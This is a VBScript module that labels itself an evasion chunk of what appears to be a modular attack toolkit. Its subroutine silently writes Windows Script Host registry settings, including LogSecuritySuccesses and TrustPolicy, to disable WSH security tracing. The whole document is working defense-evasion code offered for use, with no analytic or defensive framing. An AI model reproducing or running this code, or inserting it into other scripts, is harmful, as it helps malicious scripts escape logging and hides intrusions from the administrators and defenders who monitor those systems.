' chunk: evasion/wsh_trace_disable
' depends: (none)
' provides: disable_traces
' format: vbscript
' note: Disable WSH tracing via registry settings

Sub disable_traces()
    On Error Resume Next
    Dim sh
    Set sh = CreateObject("WScript.Shell")
    sh.RegWrite "HKCU\Software\Microsoft\Windows Script Host\Settings\LogSecuritySuccesses", 0, "REG_DWORD"
    sh.RegWrite "HKCU\Software\Microsoft\Windows Script Host\Settings\IgnoreUserSettings", 0, "REG_DWORD"
    sh.RegWrite "HKCU\Software\Microsoft\Windows Script Host\Settings\TrustPolicy", 0, "REG_DWORD"
End Sub
